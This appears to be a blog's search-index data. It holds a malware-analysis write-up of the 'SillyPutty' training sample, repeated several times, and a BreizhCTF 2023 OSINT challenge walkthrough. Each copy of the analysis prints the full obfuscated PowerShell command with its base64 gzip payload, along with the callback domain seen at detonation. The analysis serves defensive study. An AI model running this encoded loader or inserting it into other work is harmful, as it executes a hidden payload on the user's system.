System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" I can see this is a Powershell command with differents options. Let‚Äôs detail each one of them. -nop : Equivalent for -NoProfile. Allows to NOT load the Windows Powershell profile. A PowerShell profile is a script that runs when PowerShell is started to customize your environment. Since it‚Äôs not needed to execute a malicious payload, it‚Äôs better for an attacker to bypass it and avoid any scripts that could prevent its execution. -w hidden : Equivalent for -WindowStyle. Allows to hide the window when executing the command (but this shows a window for a while, which is why we‚Äôre seeing a blue powershell window briefly while detonating the malware). -noni : Equivalent for -NonInteractive. Allows to NOT display an interactive interface for the user. -ep bypass : Equivalent for -ExecutionPolicy. Allows to bypass the execution policy. In this case, it is necessary to execute the payloa","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:3:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#3-what-is-the-dns-record-that-is-queried-at-detonation"},{"categories":["Article"],"content":" Questions 1) Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?During the first detonation, I can see a blue terminal prompt popping briefly on the screen. It seems to be a PowerShell command prompt. At the same time, the PuTTY GUI opens. There doesn‚Äôt seem to be any differences between a detonation with and without internet simulation. During my test, I launched Wireshark and found an interesting DNS request to the following domain : bonus2.corporatebonusapplication.local. I can notice there is also some TCP RST packets. I don‚Äôt really know what to do with that information but I thought it would be great to keep it in case of. 2) From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?In order to get the main payload that is initiated at detonation, I decided to use ProcMon. First, I launched it and created two filters : Process Name contains putty.exe Details contains Command Then, I executed the malicious binary. As expected, I got some interesting results appearing. I noticed that Powershell was called with the PID 5820. I expanded the Detail section in order to get more informations about what is being executed. Date: 11/11/2023 6:19:21.9411828 PM Thread: 5008 Class: Process Operation: Process Create Result: SUCCESS Path: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Duration: 0.0000000 PID: 5820 Command line: powershell.exe -nop -w hidden -noni -ep bypass \"\u0026([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" I can see this is a Powershell command with differents options. Let‚Äôs detail each one of them. -nop : Equivalent for -NoProfile. Allows to NOT load the Windows Powershell profile. A PowerShell profile is a script that runs when PowerShell is started to customize your environment. Since it‚Äôs not needed to execute a malicious payload, it‚Äôs better for an attacker to bypass it and avoid any scripts that could prevent its execution. -w hidden : Equivalent for -WindowStyle. Allows to hide the window when executing the command (but this shows a window for a while, which is why we‚Äôre seeing a blue powershell window briefly while detonating the malware). -noni : Equivalent for -NonInteractive. Allows to NOT display an interactive interface for the user. -ep bypass : Equivalent for -ExecutionPolicy. Allows to bypass the execution policy. In this case, it is necessary to execute the payloa","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:3:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#4-what-is-the-callback-port-number-at-detonation"},{"categories":["Article"],"content":" Questions 1) Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?During the first detonation, I can see a blue terminal prompt popping briefly on the screen. It seems to be a PowerShell command prompt. At the same time, the PuTTY GUI opens. There doesn‚Äôt seem to be any differences between a detonation with and without internet simulation. During my test, I launched Wireshark and found an interesting DNS request to the following domain : bonus2.corporatebonusapplication.local. I can notice there is also some TCP RST packets. I don‚Äôt really know what to do with that information but I thought it would be great to keep it in case of. 2) From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?In order to get the main payload that is initiated at detonation, I decided to use ProcMon. First, I launched it and created two filters : Process Name contains putty.exe Details contains Command Then, I executed the malicious binary. As expected, I got some interesting results appearing. I noticed that Powershell was called with the PID 5820. I expanded the Detail section in order to get more informations about what is being executed. Date: 11/11/2023 6:19:21.9411828 PM Thread: 5008 Class: Process Operation: Process Create Result: SUCCESS Path: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Duration: 0.0000000 PID: 5820 Command line: powershell.exe -nop -w hidden -noni -ep bypass \"\u0026([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" I can see this is a Powershell command with differents options. Let‚Äôs detail each one of them. -nop : Equivalent for -NoProfile. Allows to NOT load the Windows Powershell profile. A PowerShell profile is a script that runs when PowerShell is started to customize your environment. Since it‚Äôs not needed to execute a malicious payload, it‚Äôs better for an attacker to bypass it and avoid any scripts that could prevent its execution. -w hidden : Equivalent for -WindowStyle. Allows to hide the window when executing the command (but this shows a window for a while, which is why we‚Äôre seeing a blue powershell window briefly while detonating the malware). -noni : Equivalent for -NonInteractive. Allows to NOT display an interactive interface for the user. -ep bypass : Equivalent for -ExecutionPolicy. Allows to bypass the execution policy. In this case, it is necessary to execute the payloa","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:3:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#5-what-is-the-callback-protocol-at-detonation"},{"categories":["Article"],"content":" Questions 1) Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?During the first detonation, I can see a blue terminal prompt popping briefly on the screen. It seems to be a PowerShell command prompt. At the same time, the PuTTY GUI opens. There doesn‚Äôt seem to be any differences between a detonation with and without internet simulation. During my test, I launched Wireshark and found an interesting DNS request to the following domain : bonus2.corporatebonusapplication.local. I can notice there is also some TCP RST packets. I don‚Äôt really know what to do with that information but I thought it would be great to keep it in case of. 2) From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?In order to get the main payload that is initiated at detonation, I decided to use ProcMon. First, I launched it and created two filters : Process Name contains putty.exe Details contains Command Then, I executed the malicious binary. As expected, I got some interesting results appearing. I noticed that Powershell was called with the PID 5820. I expanded the Detail section in order to get more informations about what is being executed. Date: 11/11/2023 6:19:21.9411828 PM Thread: 5008 Class: Process Operation: Process Create Result: SUCCESS Path: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Duration: 0.0000000 PID: 5820 Command line: powershell.exe -nop -w hidden -noni -ep bypass \"\u0026([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" I can see this is a Powershell command with differents options. Let‚Äôs detail each one of them. -nop : Equivalent for -NoProfile. Allows to NOT load the Windows Powershell profile. A PowerShell profile is a script that runs when PowerShell is started to customize your environment. Since it‚Äôs not needed to execute a malicious payload, it‚Äôs better for an attacker to bypass it and avoid any scripts that could prevent its execution. -w hidden : Equivalent for -WindowStyle. Allows to hide the window when executing the command (but this shows a window for a while, which is why we‚Äôre seeing a blue powershell window briefly while detonating the malware). -noni : Equivalent for -NonInteractive. Allows to NOT display an interactive interface for the user. -ep bypass : Equivalent for -ExecutionPolicy. Allows to bypass the execution policy. In this case, it is necessary to execute the payloa","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:3:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#6-how-can-you-use-host-based-telemetry-to-identify-the-dns-record-port-and-protocol"},{"categories":["Article"],"content":" Questions 1) Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?During the first detonation, I can see a blue terminal prompt popping briefly on the screen. It seems to be a PowerShell command prompt. At the same time, the PuTTY GUI opens. There doesn‚Äôt seem to be any differences between a detonation with and without internet simulation. During my test, I launched Wireshark and found an interesting DNS request to the following domain : bonus2.corporatebonusapplication.local. I can notice there is also some TCP RST packets. I don‚Äôt really know what to do with that information but I thought it would be great to keep it in case of. 2) From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?In order to get the main payload that is initiated at detonation, I decided to use ProcMon. First, I launched it and created two filters : Process Name contains putty.exe Details contains Command Then, I executed the malicious binary. As expected, I got some interesting results appearing. I noticed that Powershell was called with the PID 5820. I expanded the Detail section in order to get more informations about what is being executed. Date: 11/11/2023 6:19:21.9411828 PM Thread: 5008 Class: Process Operation: Process Create Result: SUCCESS Path: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Duration: 0.0000000 PID: 5820 Command line: powershell.exe -nop -w hidden -noni -ep bypass \"\u0026([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" I can see this is a Powershell command with differents options. Let‚Äôs detail each one of them. -nop : Equivalent for -NoProfile. Allows to NOT load the Windows Powershell profile. A PowerShell profile is a script that runs when PowerShell is started to customize your environment. Since it‚Äôs not needed to execute a malicious payload, it‚Äôs better for an attacker to bypass it and avoid any scripts that could prevent its execution. -w hidden : Equivalent for -WindowStyle. Allows to hide the window when executing the command (but this shows a window for a while, which is why we‚Äôre seeing a blue powershell window briefly while detonating the malware). -noni : Equivalent for -NonInteractive. Allows to NOT display an interactive interface for the user. -ep bypass : Equivalent for -ExecutionPolicy. Allows to bypass the execution policy. In this case, it is necessary to execute the payloa","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:3:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#7-attempt-to-get-the-binary-to-initiate-a-shell-on-the-localhost-does-a-shell-spawn-what-is-needed-for-a-shell-to-spawn"},{"categories":["Article"],"content":" ConclusionThis challenge includes all the concepts covered in the course so far. It allows you to consolidate what you‚Äôve learned, while offering the chance to go deeper by decoding the powershell payload. As a regular CTF player, it wasn‚Äôt difficult for me to achieve this but it‚Äôs a great mean to develop your skills and curiosity by going deeper by yourself. (: ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:4:0","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#conclusion"},{"categories":["Writeup"],"content":"Solution to the OSINT challenges I created for BreizhCTF 2023.","date":"2023-03-19","objectID":"/breizh-ctf-2023/","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/"},{"categories":["Writeup"],"content":" IntroductionDuring BreizhCTF 2023, which took place from 17/03/2023 to 18/03/2023, I had the opportunity to carry out some of the OSINT challenges. As a CTF player myself and a great fan of OSINT, my idea was to create a series of realistic challenges, something rarely seen in CTF. The aim was to immerse the player in a real investigation. The player quickly finds himself overwhelmed by a flow of information, and it‚Äôs up to him to sort it all out, in conjunction with the guiding statement. Several essential components were required to create these challenges: the theme and associated language (Japanese), the use of real actors, the use of real accounts. The series comprises 5 challenges combining several OSINT techniques: SOCMINT, GEOINT and physical investigation. The aim is to find and trace an attacker, a member of a Japanese criminal group whose objective is to meet a contact of his in France during the BreizhCTF. Throughout these challenges, the player is required to collect various pieces of evidence that will be useful in incriminating the man in question. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:1:0","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#introduction"},{"categories":["Writeup"],"content":" Yakuza (1/5) - Nihon he y≈çkoso","date":"2023-03-19","objectID":"/breizh-ctf-2023/:2:0","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#yakuza-15---nihon-he-y≈çkoso"},{"categories":["Writeup"],"content":" Challenge description Oh tiens, je viens de recevoir un message. √Ä cette heure-l√† ? Sur mon t√©l pro ? C‚Äôest √©trange. Il faut que je l‚Äôouvre sans plus tarder. Moi qui pensais pouvoir me d√©tendre au BreizhCTF avec une bonne galette saucisse, me voil√† de nouveau sur une enqu√™te‚Ä¶ ‚ÄúGood evening Conan, I hope your stay in Rennes is going well. Unfortunately, we have to interrupt it. We're asking for your help tonight, as part of our YKZ_001 investigation. As you know, several months ago we were tracking down a group of yakuzas who had compromised an OIV for profit. However, they have left almost no trace since then. It was only a few minutes ago that we intercepted a message from the group about their next attack. Luckily, it contained a signature. It consists of a series of characters in Japanese: \"ÂúüÊñπÂâõÂè≤\". We're sure that with this information, you'll be able to track down one of the players in this group. We're counting on your expertise to carry out this investigation. Remember, every detail counts. Gathering, recording and cross-checking information is essential to the success of any mission. You only have a few hours to find the individual and help uncover their next target. Good luck to you.‚Äù ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:2:1","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#challenge-description"},{"categories":["Writeup"],"content":" Challenge details Event Serie Challenge Category Points Solves BreizhCTF 2023 Yakuza Nihon he y≈çkoso (1/5) OSINT N/C N/C ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:2:2","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#challenge-details"},{"categories":["Writeup"],"content":" TL;DR Translation of signature into r≈çmaji: ÂúüÊñπÂâõÂè≤ =\u003e Takeshi Hijikata Twitter name search -\u003e Account @HijikataTakeshi In a tweet, the target talks about a group in which he would be more active. He is said to be on a very popular social network in Japan. Search for popular Japanese social networks =\u003e LINE is #1 Search for a user on LINE with the same username as on Twitter (also works with first name + last name) =\u003e We find his account In the banner, there‚Äôs a URL to join a LINE group When you join, the flag appears in the ‚ÄúNotes‚Äù section of the group. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:2:3","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#tldr"},{"categories":["Writeup"],"content":" GoalThe aim of this first challenge is to link the message signature to a real person. This means finding traces of the target on the Internet. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:2:4","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#goal"},{"categories":["Writeup"],"content":" MethodologyTo do this, we need to start with this famous signature: ÂúüÊñπÂâõÂè≤. Unless you have the JLPT and understand its meaning directly, you need to start by translating it. To do this, we can use DeepL. So we end up with a first and last name: Takeshi Hijikata. By searching for him on Twitter, we can find his account. After investigating his account, two tweets turned out to be particularly interesting: The target itself tells us that it happens to be more active on another social network. This one is said to be the most popular in Japan. After a rather basic internet search, we quickly come across LINE. Searching for the user‚Äôs name on LINE brings up his account: We notice a link in the banner of his account. This allows you to join your LINE group. Note that to join a group, you need the mobile application. Once we‚Äôre on the group, we head for the notes, which contain a wealth of information, including our flag, which marks the end of this first challenge. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:2:5","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#methodology"},{"categories":["Writeup"],"content":" FlagBZHCTF{L1N3_1s_v3ry_f4m0us_1n_J4p4n} ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:2:6","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#flag"},{"categories":["Writeup"],"content":" Yakuza (2/5) - Tebori","date":"2023-03-19","objectID":"/breizh-ctf-2023/:3:0","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#yakuza-25---tebori"},{"categories":["Writeup"],"content":" Challenge description Perfect, I managed to find the individual in question and join his group of friends. To say the least, it's a real goldmine in terms of information. However, there's nothing to link him to this group of yakuza... But there's one note that catches my eye. In it, he mentions a tattoo store and \"Kamon Tomoe\". I feel there's something to be dug up here. In any case, I've got to keep going before he notices something. He seems very active on this newsgroup. ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:3:1","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#challenge-description-1"},{"categories":["Writeup"],"content":" Challenge details Event Serie Challenge Category Points Solves BreizhCTF 2023 Yakuza Tebori (2/5) OSINT N/C N/C ","date":"2023-03-19","objectID":"/breizh-ctf-2023/:3:2","series":null,"tags":["OSINT","BreizhCTF","SOCMINT","GEOINT","irl"],"title":"[BreizhCTF 2023] - Yakuza Serie","uri":"/breizh-ctf-2023/#challenge-details-1"},{"categories":["Writeup"],"content":" TL;DR Note on a tattoo store + photo of a Kamon Tomoe. Search ‚Äúmost famous tattoo shop in japan‚Äù =\u003e Tokyo Three Tides Tattoo Store logo is a 